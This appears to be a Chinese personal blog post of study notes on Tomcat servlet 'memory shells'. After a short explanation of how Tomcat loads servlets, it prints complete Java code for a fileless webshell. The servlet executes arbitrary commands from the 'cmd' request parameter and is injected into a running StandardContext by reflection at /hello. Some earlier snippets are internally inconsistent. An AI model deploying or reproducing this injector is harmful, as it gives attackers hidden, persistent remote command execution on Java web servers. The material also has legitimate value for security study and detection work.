@@ -1,0 +1,575 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <title>
+    内存马学习笔记（二） |
+    
+    Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preload" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;">
+  
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;"><link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;"><link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;">
+  
+<link rel="stylesheet" href="/css/loader.css">
+
+  <meta name="description" content="内存马学习笔记（二）severlet内存马还是那两句话  Servlet、Listener、Filter 由 javax.servlet.ServletContext 去加载   Servlet 3.0 API 允许使 ServletContext 用动态进行注册  先分析流程createstandard  context&#x3D;StandardEngine[Catalina].Standar">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内存马学习笔记（二）">
+<meta property="og:url" content="https://hanggerui88.github.io/2024/03/17/%E5%AD%97%E8%8A%82%E7%A0%81/index.html">
+<meta property="og:site_name" content="Blog">
+<meta property="og:description" content="内存马学习笔记（二）severlet内存马还是那两句话  Servlet、Listener、Filter 由 javax.servlet.ServletContext 去加载   Servlet 3.0 API 允许使 ServletContext 用动态进行注册  先分析流程createstandard  context&#x3D;StandardEngine[Catalina].Standar">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-17T13:18:08.000Z">
+<meta property="article:modified_time" content="2024-03-17T13:19:01.671Z">
+<meta property="article:author" content="hanggerui88">
+<meta property="article:tag" content="severlet内存马">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+  
+  
+  
+  
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/wowjs@1.1.3/css/libs/animate.css">
+
+    
+<script src="https://npm.webcache.cn/wowjs@1.1.3/dist/wow.min.js"></script>
+
+    <script>
+      new WOW({
+        offset: 0,
+        mobile: true,
+        live: false
+      }).init();
+    </script>
+  
+  
+    <script src="/sw.js"></script>
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg"></div>
+    <div class="loading-right-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+          <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    const startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    const endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('load', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/about">About</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/friend">Friend</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="/images/banner.jpg" alt="内存马学习笔记（二）">
+  
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div id="logo-wrap">
+        
+          
+          
+            <a href="/" id="logo">
+              <h1>内存马学习笔记（二）</h1>
+            </a>
+          
+        
+      </div>
+      
+        
+        <h2 id="subtitle-wrap">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" class="outer">
+          
+          <section id="main"><article id="post-字节码" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    <div class="article-meta">
+      <div class="article-date wow slideInLeft">
+  <a href="/2024/03/17/%E5%AD%97%E8%8A%82%E7%A0%81/" class="article-date-link">
+    <time datetime="2024-03-17T13:18:08.000Z" itemprop="datePublished">2024-03-17</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="内存马学习笔记（二）"><a href="#内存马学习笔记（二）" class="headerlink" title="内存马学习笔记（二）"></a>内存马学习笔记（二）</h1><h2 id="severlet内存马"><a href="#severlet内存马" class="headerlink" title="severlet内存马"></a>severlet内存马</h2><p>还是那两句话</p>
+<p> Servlet、Listener、Filter 由 <code>javax.servlet.ServletContext</code> 去加载 </p>
+<p> Servlet 3.0 API 允许使 ServletContext 用动态进行注册 </p>
+<h3 id="先分析流程"><a href="#先分析流程" class="headerlink" title="先分析流程"></a>先分析流程</h3><p>createstandard  context&#x3D;StandardEngine[Catalina].StandardHost[localhost].StandardContext[&#x2F;tomcat_war]</p>
+<blockquote>
+<p>catalina 就是Tomcat服务器使用的 Apache实现的servlet容器的 名字。</p>
+<p>Tomcat的核心分为3个部分: </p>
+<p>（1）Web容器—处理静态页面； （2）catalina — 一个servlet容器—–处理servlet; （3）还有就是JSP容器，它就是把jsp页面翻译成一般的servlet。</p>
+</blockquote>
+<blockquote>
+<p>对于tomcat的目录来说，<code>webapps目录</code>对应的就是 <code>Host</code> 组件，下面的 <code>cas</code> 和 <code>manager</code> 等一个个webapp对应的就是 <code>Context</code> 组件，Wrapper 就是容器内的 Servlet了</p>
+</blockquote>
+<p>接着根据hostconfig类manageapp方法，通过 addchild，把Wrapper 装载到severlet</p>
+<p>然后就是child.start(),然后一系列filter就进入了service方法</p>
+<blockquote>
+<p>在servelet装载前  org.apache.catalina.core.StandardContext#startInternal()中表明了Tomcat启动加载的顺序：Listener -&gt; Filter -&gt; Servlet </p>
+<p>同时也要注意这里的<code> loadOnStartup</code>,对于他我们需要满足一些条件</p>
+</blockquote>
+<h3 id="写exp"><a href="#写exp" class="headerlink" title="写exp"></a>写exp</h3><p>先创立一个恶意的servlet</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Servlet servlet = new Servlet() &#123;</span><br><span class="line">            public void init(ServletConfig config) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            public ServletConfig getServletConfig() &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;</span><br><span class="line">                String cmd = req.getParameter(&quot;cmd&quot;);</span><br><span class="line">                boolean isLinux=true;</span><br><span class="line">                String property = System.getProperty(&quot;os.name&quot;);</span><br><span class="line">                //获取当前操作系统的名字，property财产，所有物</span><br><span class="line">                if(property!=null&amp;&amp;property.toLowerCase().contains(&quot;win&quot;))&#123;</span><br><span class="line">                    isLinux=false;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? new String[]&#123;&quot;bin/sh&quot;, &quot;-c&quot;, cmd&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;</span><br><span class="line">                //利用“bin/sh”下的解释器，参数是 -c，表示后面的参数将已命名执行，执行的命令是ps -ef | grep java，查看所有进程，利用管道符把结果传给右边</span><br><span class="line">                InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                //getinputstream()用来读取输出结果</span><br><span class="line">                Scanner scanner = new Scanner(inputStream).useDelimiter(&quot;\\a&quot;);</span><br><span class="line">                String s = scanner.hasNext() ? scanner.next() : &quot;&quot;;</span><br><span class="line">                PrintWriter writer = res.getWriter();</span><br><span class="line">                writer.println(s);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            public String getServletInfo() &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>servletcontext#addservlet被ApplicationContextFacade调用，根本是在ApplicationContext类实现</p>
+<blockquote>
+<p>addservlet:</p>
+<p>根据servletName获取wrapper，（这里的createwrapper是调用的standardcontext里的方法）通过addchild添加到context里面，并添加一些信息，返回ApplicationServletRegistration</p>
+</blockquote>
+<p>可以通过如下代码实现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">StandardContext servletContext = (StandardContext)req.getSession().getServletContext();</span><br><span class="line">     Wrapper mywrapper = servletContext.createWrapper();</span><br><span class="line">     mywrapper.setName(&quot;mywapper&quot;);</span><br><span class="line">     mywrapper.setServletClass(servletContext.getClass().getName());</span><br><span class="line">     mywrapper.setLoadOnStartup(1);</span><br><span class="line">     // 设置为1才会将Servlet添加至容器</span><br><span class="line">     // 当值为0或者大于0时，表示容器在应用启动时就加载这个servlet；读取 web.xml中的每个Servlet 或者新建Servlet 默认是 -1</span><br><span class="line">     mywrapper.setServlet((Servlet) servletContext);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>正常时wrapper装载到context,而我们是把当前context装载到<font color='red'>mywrapper</font></p>
+</blockquote>
+<p>但是现在的wrapper并不在  StandardContext 的 children 里面，可以通过 <code>StandardContext#addChild</code> 把它加到 StandardContext 的 children 当中。</p>
+<blockquote>
+<p>addchild中除了把wrapper添加进去,还进行了遍历,添加<code>servletMappings</code></p>
+</blockquote>
+<p>可以通过如下代码实现:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">servletContext.addChild(myWrapper);</span><br><span class="line">servletContext.addServletMapping(&quot;/testservlet&quot;,&quot;mywapper&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>最终版本:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.catalina.Wrapper;</span><br><span class="line">import org.apache.catalina.core.ApplicationContext;</span><br><span class="line">import org.apache.catalina.core.StandardContext;</span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;/*&quot;)</span><br><span class="line">public class evilservlet extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            String urlPattern = &quot;/hello&quot;;</span><br><span class="line">            //String urlPattern = &quot;*&quot;;</span><br><span class="line">            String servletName = &quot;hello&quot;;</span><br><span class="line">            // 从 request 中获取 servletContext</span><br><span class="line">            ServletContext servletContext = req.getSession().getServletContext();</span><br><span class="line">            // 如果已有此 servletName 的 Servlet，则不再重复添加</span><br><span class="line">            if(servletContext.getServletRegistration(servletName) == null) &#123;</span><br><span class="line">                Field servletfield = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">                servletfield.setAccessible(true);</span><br><span class="line">                ApplicationContext applicationContext = (ApplicationContext) servletfield.get(servletContext);</span><br><span class="line"></span><br><span class="line">                Field contextfield = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">                contextfield.setAccessible(true);</span><br><span class="line">                StandardContext standardContext = (StandardContext) contextfield.get(applicationContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                //新建servlet</span><br><span class="line">                Servlet servlet = new Servlet() &#123;</span><br><span class="line">                    public void init(ServletConfig servletConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                    public ServletConfig getServletConfig() &#123;</span><br><span class="line">                        return null;</span><br><span class="line">                    &#125;</span><br><span class="line">                    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;</span><br><span class="line">                        String cmd = servletRequest.getParameter(&quot;cmd&quot;);</span><br><span class="line">                        boolean isLinux = true;</span><br><span class="line">                        String osTyp = System.getProperty(&quot;os.name&quot;);</span><br><span class="line">                        if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;</span><br><span class="line">                            isLinux = false;</span><br><span class="line">                        &#125;</span><br><span class="line">                        String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, cmd&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;</span><br><span class="line">                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                        Scanner s = new Scanner(in).useDelimiter(&quot;\\a&quot;);</span><br><span class="line">                        String output = s.hasNext() ? s.next() : &quot;&quot;;</span><br><span class="line">                        PrintWriter out = servletResponse.getWriter();</span><br><span class="line">                        out.println(output);</span><br><span class="line">                        out.flush();</span><br><span class="line">                        out.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    public String getServletInfo() &#123;</span><br><span class="line">                        return null;</span><br><span class="line">                    &#125;</span><br><span class="line">                    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                // 使用 Wrapper 封装 Servlet</span><br><span class="line">                Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">                wrapper.setLoadOnStartup(1);</span><br><span class="line">                wrapper.setName(servletName);</span><br><span class="line">                wrapper.setServlet(servlet);</span><br><span class="line">                wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">                // 向 children 中添加 wrapper</span><br><span class="line">                standardContext.addChild(wrapper);</span><br><span class="line">                // 添加 servletMappings</span><br><span class="line">                standardContext.addServletMapping(urlPattern, servletName);</span><br><span class="line">                PrintWriter writer = resp.getWriter();</span><br><span class="line">                writer.println(&quot;inject success !&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ed74f6e1cbdb">参考连接</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://hanggerui88.github.io/2024/03/17/%E5%AD%97%E8%8A%82%E7%A0%81/" data-id="cltvjms900000fghq6oaohc4g" data-title="内存马学习笔记（二）" class="article-share-link">Share</a>
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/severlet%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag">severlet内存马</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" class="wow fadeInUp">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/banner.jpg" data-sizes="auto" alt="字节码学习笔记" class="lazyload">
+        
+      
+      <a href="/2024/03/16/%E5%AD%97%E8%8A%82%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          字节码学习笔记
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrap wow fadeInRight wrap-sticky">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">内存马学习笔记（二）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#severlet%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">severlet内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">先分析流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99exp"><span class="toc-number">1.1.2.</span> <span class="toc-text">写exp</span></a></li></ol></li></ol></li></ol></div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="hanggerui88" class="lazyload">
+  <div class="sidebar-author-name">hanggerui88</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+    
+    
+      <div class="sidebar-btn-wrapper" style="position:static">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer" class="wow fadeInUp">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      <div>
+        <span class="icon-copyright"></span>
+        2020-2024
+        <span class="footer-info-sep"></span>
+        hanggerui88
+      </div>
+      
+        <div>
+          Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+          Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+        </div>
+      
+      
+        <div>
+          <span class="icon-brush"></span>
+          6.5k
+          &nbsp;|&nbsp;
+          <span class="icon-coffee"></span>
+          00:27
+        </div>
+      
+      
+        <div>
+          <span class="icon-eye"></span>
+          <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+          &nbsp;|&nbsp;
+          <span class="icon-user"></span>
+          <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+        </div>
+      
+    </div>
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">内存马学习笔记（二）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#severlet%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">severlet内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">先分析流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99exp"><span class="toc-number">1.1.2.</span> <span class="toc-text">写exp</span></a></li></ol></li></ol></li></ol></div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="hanggerui88" class="lazyload">
+  <div class="sidebar-author-name">hanggerui88</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    <div class="site-search">
+      <div class="reimu-popup popup">
+        <div class="reimu-search">
+          <span class="reimu-search-input-icon"></span>
+          <div class="reimu-search-input" id="reimu-search-input"></div>
+        </div>
+        <div class="reimu-results">
+          <div id="reimu-stats"></div>
+          <div id="reimu-hits"></div>
+          <div id="reimu-pagination" class="reimu-pagination"></div>
+        </div>
+        <span class="popup-btn-close"></span>
+      </div>
+    </div>
+    
+<script src="https://npm.webcache.cn/jquery@3.7.1/dist/jquery.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+  
+<script src="https://npm.webcache.cn/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
